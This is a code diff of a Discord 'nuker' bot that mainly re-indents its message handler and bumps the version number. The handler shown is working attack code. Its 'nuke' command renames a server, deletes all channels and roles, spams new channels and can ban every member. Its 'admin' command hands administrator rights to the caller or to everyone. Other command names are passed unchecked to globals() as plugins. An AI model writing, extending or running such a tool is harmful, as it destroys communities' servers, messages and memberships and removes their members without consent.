@@ -51,7 +51,7 @@ if os.path.exists("updated"):
     clear()
 
 if __name__ == '__main__':
-    local_version = str("0.4_hf1")
+    local_version = str("0.4_hf2")
 
     http = urllib3.PoolManager()
 
@@ -316,19 +316,31 @@ async def banAll(ctx):
         except: pass
 
 
-
-@bot.event
-async def on_message(message: discord.Message):    
-    if message.author.bot:
-        return
-    msg = message.content
-    cmd_name_witout_prefix = msg.split()[0][1:]
-    if msg.startswith(config["nuke_prefix"]):
-        drawer.CenterColor(f"[{message.author}]:{msg}",theme["command_triggered_pallete"], len(f"[{message.author}]: {msg}"),theme["command_triggered_gradient_type"])
-        args = msg.split()
-        if args[0] == config['nuke_prefix']+"nuke":
-            if config['only_whitelisted_users_can_perform_actions'] == True:
-                if message.author.id in config['whitelisted_ids']:
+if __name__ == '__main__':
+    @bot.event
+    async def on_message(message: discord.Message):    
+        if message.author.bot:
+            return
+        msg = message.content
+        cmd_name_witout_prefix = msg.split()[0][1:]
+        if msg.startswith(config["nuke_prefix"]):
+            drawer.CenterColor(f"[{message.author}]:{msg}",theme["command_triggered_pallete"], len(f"[{message.author}]: {msg}"),theme["command_triggered_gradient_type"])
+            args = msg.split()
+            if args[0] == config['nuke_prefix']+"nuke":
+                if config['only_whitelisted_users_can_perform_actions'] == True:
+                    if message.author.id in config['whitelisted_ids']:
+                        curent_guild = message.guild
+                        await message.guild.edit(name=config["server_name"], icon=icon)
+                        spamCount = config['spam_in_channel_count']
+                        channelsCreate = config['channels_create_count']
+                        drawer.CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",theme["nuke_started_pallete"], theme["nuke_started_steps"],theme["nuke_started_gradient_type"])
+                        create_task(delete_channels(message.guild,))
+                        create_task(delete_roles(message.guild,))
+                        for i in range(channelsCreate):
+                            multiprocessing.Process(target=start(curent_guild)).start()
+                        if config["Ban on server nuke?"] == True:
+                            create_task(banAll(message))
+                else:
                     curent_guild = message.guild
                     await message.guild.edit(name=config["server_name"], icon=icon)
                     spamCount = config['spam_in_channel_count']
@@ -340,55 +352,43 @@ async def on_message(message: discord.Message):
                         multiprocessing.Process(target=start(curent_guild)).start()
                     if config["Ban on server nuke?"] == True:
                         create_task(banAll(message))
-            else:
-                curent_guild = message.guild
-                await message.guild.edit(name=config["server_name"], icon=icon)
-                spamCount = config['spam_in_channel_count']
-                channelsCreate = config['channels_create_count']
-                drawer.CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",theme["nuke_started_pallete"], theme["nuke_started_steps"],theme["nuke_started_gradient_type"])
-                create_task(delete_channels(message.guild,))
-                create_task(delete_roles(message.guild,))
-                for i in range(channelsCreate):
-                    multiprocessing.Process(target=start(curent_guild)).start()
-                if config["Ban on server nuke?"] == True:
-                    create_task(banAll(message))
-        elif args[0] == config["nuke_prefix"]+"admin":
-            if config['only_whitelisted_users_can_perform_actions'] == True:
-                if message.author.id in config['whitelisted_ids']:
-                    if args[1] == "me":
-                        guild = message.guild
-                        get_bot = guild.get_member(bot.user.id)
-                        top_role = max(get_bot.roles, key=lambda r: r.position)
-                        r = await guild.create_role(name=config["admin_role_name"])
-                        await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
-                        await message.author.add_roles(r)
-                        await message.delete()
-                    elif args[1] == "all":
-                        guild = message.guild
-                        get_bot = guild.get_member(bot.user.id)
-                        top_role = max(get_bot.roles, key=lambda r: r.position)
-                        r = await guild.create_role(name=config["admin_role_name"])
-                        await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
-                        await message.delete()
-                        for members in list(message.guild.members):
-                            await members.add_roles(r)
-        
-        elif args[0] != config['nuke_prefix']+"nuke" and  config["nuke_prefix"]+"admin":
-            if cmd_name_witout_prefix in globals():
-                if config["Enable_plugins?"] == True:
-                    if config['only_whitelisted_users_can_perform_actions'] == True:
-                        if message.author.id in config['whitelisted_ids']:
-                                await globals()[cmd_name_witout_prefix](message)
-                    else:
-                                await globals()[cmd_name_witout_prefix](message)
+            elif args[0] == config["nuke_prefix"]+"admin":
+                if config['only_whitelisted_users_can_perform_actions'] == True:
+                    if message.author.id in config['whitelisted_ids']:
+                        if args[1] == "me":
+                            guild = message.guild
+                            get_bot = guild.get_member(bot.user.id)
+                            top_role = max(get_bot.roles, key=lambda r: r.position)
+                            r = await guild.create_role(name=config["admin_role_name"])
+                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
+                            await message.author.add_roles(r)
+                            await message.delete()
+                        elif args[1] == "all":
+                            guild = message.guild
+                            get_bot = guild.get_member(bot.user.id)
+                            top_role = max(get_bot.roles, key=lambda r: r.position)
+                            r = await guild.create_role(name=config["admin_role_name"])
+                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
+                            await message.delete()
+                            for members in list(message.guild.members):
+                                await members.add_roles(r)
+            
+            elif args[0] != config['nuke_prefix']+"nuke" and  config["nuke_prefix"]+"admin":
+                if cmd_name_witout_prefix in globals():
+                    if config["Enable_plugins?"] == True:
+                        if config['only_whitelisted_users_can_perform_actions'] == True:
+                            if message.author.id in config['whitelisted_ids']:
+                                    await globals()[cmd_name_witout_prefix](message)
+                        else:
+                                    await globals()[cmd_name_witout_prefix](message)
 
 
-    elif msg.startswith(config["prefix"]):
-        drawer.CenterColor(f"[{message.author}]:{msg}",((0,255,255),(0,125,125),(0,255,255)), len(f"[{message.author}]: {msg}"),"H")
-    elif msg.startswith("@everyone") or msg.startswith("@here") or msg.startswith(f"<@{bot.user.id}>"):
-        drawer.CenterColor(f"[{message.author}]:{msg}",[(255,255,0),(125,125,0),(255,255,0)], len(f"[{message.author}]: {msg}"),"H")
-    else:
-        drawer.Center(f"[{message.author}]: {msg}")
+        elif msg.startswith(config["prefix"]):
+            drawer.CenterColor(f"[{message.author}]:{msg}",((0,255,255),(0,125,125),(0,255,255)), len(f"[{message.author}]: {msg}"),"H")
+        elif msg.startswith("@everyone") or msg.startswith("@here") or msg.startswith(f"<@{bot.user.id}>"):
+            drawer.CenterColor(f"[{message.author}]:{msg}",[(255,255,0),(125,125,0),(255,255,0)], len(f"[{message.author}]: {msg}"),"H")
+        else:
+            drawer.Center(f"[{message.author}]: {msg}")
 
 def start(guild):
     
@@ -401,7 +401,7 @@ if __name__ == '__main__':
         load_plugins()
     try: bot.run(config['token'])
     except Exception as e:
-        drawer.gradientText([(255,0,0),(255,0,0)],1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","H")
+        print(drawer.gradientText([(255,0,0),(255,0,0)],1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","V"))
         webbrowser.open("https://discord.gg/QTDXqt8PA8")
         stop_nuker()
 
